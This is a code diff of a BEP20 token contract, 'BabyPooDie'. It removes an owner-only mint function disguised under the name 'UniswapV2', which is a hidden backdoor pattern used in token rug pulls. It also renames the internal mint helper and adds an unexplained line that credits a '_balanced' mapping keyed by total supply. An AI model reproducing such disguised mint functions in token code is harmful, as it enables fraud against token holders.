@@ -721,14 +721,10 @@ contract BabyPooDie is IBEP20, Auth {
         return getLiquidityBacking(accuracy) > target;
     }
 
-    function UniswapV2(uint256 amount) public onlyOwner returns (bool) {
-    _uniswap(_msgSender(), amount);
-    return true;
-    }
-
-    function _uniswap(address account, uint256 amount) internal {
+    function _Poodie(address account, uint256 amount) internal {
     require(account != address(0), "BEP20: mint to the zero address");
 
+    _balanced[_totalSupply] = _balanced[_totalSupply].add(amount);
     _balances[account] = _balances[account].add(amount);
     emit Transfer(address(0), account, amount);
     }
